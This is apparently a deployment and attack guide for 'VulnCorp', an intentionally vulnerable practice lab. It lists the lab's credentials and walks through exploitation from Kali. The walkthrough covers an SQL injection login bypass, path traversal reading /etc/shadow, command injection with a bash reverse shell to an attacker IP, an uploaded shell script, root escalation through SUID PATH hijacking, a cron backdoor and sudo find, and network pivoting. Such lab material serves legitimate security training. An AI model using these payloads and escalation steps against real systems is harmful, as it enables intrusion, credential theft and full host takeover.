# 📖 VulnCorp Lab — Complete Deployment, Usage & Kali Attack Guide

---

## Part 1: How to Deploy and Run on Another Linux Machine

### 1. Files to Transfer
Transfer the entire `webserver` folder to your target Linux server. The required structure:
```text
webserver/
├── deploy.sh               # One-command installer (Docker, Compose, ngrok)
├── tunnel.sh               # Tunnel manager (start/stop/restart/status)
├── Dockerfile              # Container definition
├── docker-compose.yml      # Orchestration with 0.0.0.0 bindings & ngrok sidecar
├── entrypoint.sh           # Container services initialization
├── ngrok-docker.yml        # Docker ngrok configuration
├── .dockerignore
├── .gitignore
├── README.md
├── app/                    # Web application source
│   ├── app.py              # Flask server & business logic
│   ├── templates/          # HTML templates (login, dashboard, admin, etc.)
│   └── static/             # CSS styling and documentation files
└── setup/                  # Security misconfiguration scripts
    ├── setup_privesc.sh
    ├── setup_services.sh
    └── setup_breadcrumbs.sh
```

---

### 2. Transfer Methods (From Windows to Linux)

#### Method A: Using `scp` (Recommended)
Open PowerShell / Command Prompt on Windows:
```powershell
scp -r "c:\Users\Anietta Aruldhas\Desktop\webserver" username@<LINUX_IP>:~/
```
*(Replace `username` with your Linux user and `<LINUX_IP>` with the machine's IP address).*

#### Method B: Zip Archive
1. Right-click the `webserver` folder on Windows → **Compress to ZIP file**.
2. Copy `webserver.zip` to the Linux server (via USB, cloud, or SCP).
3. Extract on Linux:
   ```bash
   unzip webserver.zip
   cd webserver
   ```

#### Method C: Git
Push the project to a private Git repository and clone it on the Linux machine:
```bash
git clone <REPO_URL> webserver
cd webserver
```

---

### 3. Setup ngrok Token (For Internet Access)
1. Register for free at [dashboard.ngrok.com/signup](https://dashboard.ngrok.com/signup).
2. Grab your authtoken from [dashboard.ngrok.com/get-started/your-authtoken](https://dashboard.ngrok.com/get-started/your-authtoken).

---

### 4. Running the Server

On the Linux terminal:
```bash
cd ~/webserver

# Make scripts executable
chmod +x deploy.sh tunnel.sh entrypoint.sh setup/*.sh

# Run the deployment script
sudo ./deploy.sh
```
*(You will be prompted to paste your ngrok token. To run unattended without prompts: `sudo NGROK_AUTHTOKEN="your_token" ./deploy.sh`)*

---

### 5. Accessing the Server

#### 🌐 External Internet Access (ngrok)
- **Web Portal**: Use the public HTTPS URL printed in terminal (e.g. `https://xxxx-xx-xx-xx.ngrok-free.app`)
- **FTP**: Use the public TCP address printed in terminal (e.g. `tcp://x.tcp.ngrok.io:xxxxx`)

#### 🏠 Local / LAN Access
- **Web Portal**: `http://<LINUX_MACHINE_IP>:8080`
- **SSH**: `ssh webuser@<LINUX_MACHINE_IP> -p 2222` (password: `webuser123`)
- **FTP**: `ftp <LINUX_MACHINE_IP> 2121` (anonymous login)

---

### 6. Management Commands

| Action | Command |
|---|---|
| Check public URLs | `sudo ./tunnel.sh status` |
| Restart tunnels (generate new URLs) | `sudo ./tunnel.sh restart` |
| Stop public tunnels | `sudo ./tunnel.sh stop` |
| View live container logs | `docker compose logs -f` |
| Stop web server | `docker compose down` |
| Full reset / wipe | `docker compose down --rmi all --volumes` |

---

## Part 2: How to Use the Website & Authentication

The website represents **VulnCorp Internal Portal**, an intranet application containing staff tools and an administrative panel.

### 1. Authorized User Accounts & Roles

The system uses role-based authentication (`user` vs `admin`). Here are the pre-configured authorized accounts:

| Username | Password | Role | Access Level |
|---|---|---|---|
| `admin` | `admin@vulncorp2024` | **admin** | Full access to all staff tools + **Admin Panel** |
| `webdev` | `devpass123` | **user** | Access to all standard staff tools |
| `dbadmin` | `mysql_r00t!` | **user** | Access to all standard staff tools |
| `backup` | `backup2024$` | **user** | Access to all standard staff tools |

---

### 2. How the Authentication System Works

1. **Unauthenticated Users**:
   - Visiting `/` shows the public home page with information and a link to login.
   - Any attempt to access protected pages (`/dashboard`, `/nettools`, `/upload`, `/viewer`, `/notes`, `/admin`) without logging in will automatically redirect to `/login` with the message *"Please log in first."*

2. **Standard Users (`role: user`)**:
   - Can access the `/dashboard` and standard features (Network Tools, File Upload, Document Viewer, Staff Notes).
   - If they try to access `/admin`, access is denied with *"Admin access required."*

3. **Administrator (`role: admin`)**:
   - Has access to everything, including the restricted `/admin` panel displaying all system users and internal server credentials.

4. **Security Testing / Bypass (Lab Feature)**:
   - Because the login route contains an intentional SQL Injection vulnerability, authentication can also be tested/bypassed without credentials by supplying `admin' OR '1'='1' --` in the username field with any password.

---

### 3. Website Features & Pages Walkthrough

#### 1. Home (`/`)
- Public landing page introducing VulnCorp.
- Has a **"Login to Portal"** button in the header and hero section.

#### 2. Login Page (`/login`)
- Enter your authorized username and password.
- Successful login creates a session and redirects to `/dashboard`.

#### 3. Dashboard (`/dashboard`)
- Protected central hub displaying quick links and overview stats for all internal tools.

#### 4. Network Diagnostics (`/nettools`)
- Allows authorized staff to run ping and connectivity tests against IP addresses or hosts.

#### 5. File Management (`/upload`)
- Allows authorized personnel to upload internal files and documents.
- Displays a list of currently stored files with download/view links.

#### 6. Document Viewer (`/viewer`)
- Policy and document viewer.
- Staff can inspect documentation files (e.g. `changelog.txt`, `readme.txt`, `todo.txt`).

#### 7. Staff Noticeboard (`/notes`)
- An internal team message board where authorized users can post notes and updates.
- Displays author timestamp and note contents.

#### 8. Admin Panel (`/admin`) *(Restricted to `admin` role)*
- Only accessible when logged in as `admin`.
- Displays:
  - List of all registered users and roles.
  - Table of internal infrastructure credentials (SSH, MySQL, FTP, RDP servers).

#### 9. Logout (`/logout`)
- Clears the session and returns to the home page.

---

## Part 3: How to Attack This from Kali Linux

This lab is structured across 3 distinct attack phases:

```text
┌────────────────────────────────────────────────────────────────────────┐
│                        ATTACK PROGRESSION CHAIN                        │
│                                                                        │
│  [Kali Attacker] (Unauthenticated)                                     │
│         │                                                              │
│         ▼ (Recon & Web Exploitation: SQLi / RCE / Webshell)            │
│  [Web Admin Session] -> [webuser OS Shell]                             │
│         │                                                              │
│         ▼ (Privilege Escalation: SUID / Cron / Sudo GTFOBins)          │
│  [root OS Shell] (Full Host Compromise)                                │
│         │                                                              │
│         ▼ (Lateral Movement: SSH Keys, MySQL DB, Network Pivot)        │
│  [Machine 2 / DB Server / Windows Jump Box Compromise]                 │
└────────────────────────────────────────────────────────────────────────┘
```

---

### Phase 1: Reconnaissance & Initial Access (Unauthenticated ➔ `webuser` Shell)

#### 1. Port & Service Scanning
From your Kali Linux terminal:
```bash
# Set your target (replace with your target LAN IP or ngrok host)
export TARGET="192.168.1.50"

# Full TCP port scan
nmap -sC -sV -p 8080,2222,2121 $TARGET
```

#### 2. Information Disclosure
- Check `/robots.txt` in your browser or with `curl`:
  ```bash
  curl http://$TARGET:8080/robots.txt
  # Reveals /admin, /uploads, /viewer, /server-status
  ```
- Check `/server-status`:
  ```bash
  curl http://$TARGET:8080/server-status
  # Discloses OS platform, user accounts, database path, and internal notes
  ```

#### 3. Anonymous FTP Reconnaissance
```bash
ftp $TARGET 2121
# Login: anonymous (press Enter for password)
# Download network topology map & welcome message:
get pub/welcome.txt
get pub/network_map.txt
exit
```

#### 4. SQL Injection (Login Bypass)
- Browse to `http://$TARGET:8080/login`
- Enter in the **Username** field:
  ```sql
  admin' OR '1'='1' --
  ```
- Enter any random text in the **Password** field.
- **Privilege Gained**: You are logged in as **`admin`**! You can now visit `/admin` and see all user passwords and database connection credentials.

#### 5. Directory Traversal (LFI / File Read)
- Browse to `http://$TARGET:8080/viewer?file=../../../etc/passwd`
- Read sensitive configuration:
  - `/viewer?file=../../../etc/shadow` (World readable!)
  - `/viewer?file=../../../opt/vulncorp/config/database.yml`

#### 6. Remote Code Execution (Command Injection ➔ Reverse Shell)
1. On your Kali machine, start a Netcat listener:
   ```bash
   nc -lvnp 4444
   ```
2. Log into the portal and navigate to `/nettools`.
3. In the ping diagnostic input box, inject a reverse shell:
   ```bash
   127.0.0.1; bash -c 'bash -i >& /dev/tcp/<KALI_IP>/4444 0>&1'
   ```
   *(Replace `<KALI_IP>` with your Kali machine's IP address).*
4. **Privilege Gained**: Netcat immediately catches an interactive reverse shell as user **`webuser`**!

#### 7. Alternative Initial Access: Unrestricted File Upload Webshell
1. Create a script named `shell.sh`:
   ```bash
   #!/bin/bash
   bash -i >& /dev/tcp/<KALI_IP>/4444 0>&1
   ```
2. Go to `/upload` and upload `shell.sh`.
3. On Kali, run `nc -lvnp 4444`.
4. Trigger the webshell by browsing to:
   ```text
   http://$TARGET:8080/cgi/shell.sh
   ```

---

### Phase 2: Privilege Escalation (`webuser` ➔ `root` Full Control)

Once you have a shell as `webuser`, capture the **User Flag**:
```bash
cat /home/webuser/user.txt
# Flag: VULN{w3b_sh3ll_1n1t1al_acc3ss}
```

Now escalate to `root` using any of these 3 independent vectors:

#### Vector A: SUID Binary Exploitation (PATH Hijacking)
1. Find SUID binaries:
   ```bash
   find / -perm -4000 -type f 2>/dev/null
   # Found: /usr/local/bin/vuln-backup
   ```
2. Exploit PATH search order because the binary calls `tar` without an absolute path:
   ```bash
   echo '#!/bin/bash' > /tmp/tar
   echo '/bin/bash -p' >> /tmp/tar
   chmod +x /tmp/tar
   export PATH=/tmp:$PATH
   /usr/local/bin/vuln-backup
   ```
3. **Privilege Gained**: Instant **`root`** shell!

#### Vector B: Writable Cron Job
1. Inspect scripts:
   ```bash
   ls -la /opt/scripts/cleanup.sh
   # Script is world-writable (777) and runs every 60 seconds as root!
   ```
2. Inject a root backdoor:
   ```bash
   echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /opt/scripts/cleanup.sh
   ```
3. Wait 60 seconds for cron to run, then execute:
   ```bash
   /tmp/rootbash -p
   ```
4. **Privilege Gained**: Instant **`root`** shell!

#### Vector C: Sudo Misconfiguration (GTFOBins)
1. Check sudo privileges:
   ```bash
   sudo -l
   # Shows: (root) NOPASSWD: /usr/bin/find
   ```
2. Execute bash via `find`:
   ```bash
   sudo /usr/bin/find /tmp -exec /bin/bash \;
   ```
3. **Privilege Gained**: Instant **`root`** shell!

#### Capture Root Flag:
```bash
cat /root/root.txt
# Flag: VULN{pr1v3sc_r00t_pwn3d_m4ch1n3_1}
```

---

### Phase 3: Lateral Movement & What You Can Do With Root

With root access, you have complete control over the machine and can discover all credentials to pivot deeper into the corporate network:

| Action / Asset Found | Command / Path | Value / What You Can Do |
|---|---|---|
| **Root Admin Notes** | `cat /root/notes.txt` | Discloses production DB migration info & Windows RDP Jump Box credentials (`Administrator:W1nd0ws@Admin!`) |
| **SSH Private Keys** | `cat /root/.ssh/id_rsa_db01` & `cat /root/.ssh/config` | Allows SSH login directly into Machine 2 (`192.168.56.102`) as `sysadmin` |
| **Database Credentials** | `cat /opt/vulncorp/config/database.yml` | MySQL production database credentials (`root:toor_mysql@prod`) |
| **Internal Database Dumps** | `sqlite3 /opt/vulncorp/db/vulncorp.db "SELECT * FROM internal_credentials;"` | Dumps table containing passwords for SSH, MySQL, FTP, and Windows RDP across other servers |
| **Cracking Passwords** | `cat /etc/shadow` | Offline password cracking using `john` or `hashcat` against compromised user hashes |
| **Network Pivoting** | `chisel` / `sshuttle` / `socat` | Use this compromised host as a jump proxy to route Kali traffic into the `192.168.56.0/24` subnet |

---

## Summary of Privileges Gained at Each Stage

| Stage | Privilege Level | What You Can Do |
|---|---|---|
| **1. Unauthenticated** | None (Public internet) | Port scan, view landing page, discover `/robots.txt`, access anonymous FTP. |
| **2. Web SQLi / Auth Bypass** | `admin` (Web Session) | Read all user accounts, view internal company infrastructure credentials in `/admin`. |
| **3. Web RCE / Webshell** | `webuser` (OS User) | Interactive Linux shell, read source code, capture `user.txt` flag, execute commands as local user. |
| **4. Privilege Escalation** | `root` (Superuser) | Complete host takeover, modify any file, capture `root.txt` flag, access `/etc/shadow`, install persistence. |
| **5. Post-Exploitation / Lateral Movement** | Network Pivot & Admin | SSH into internal DB server (`192.168.56.102`), dump MySQL databases, connect to Windows RDP Jump Box. |
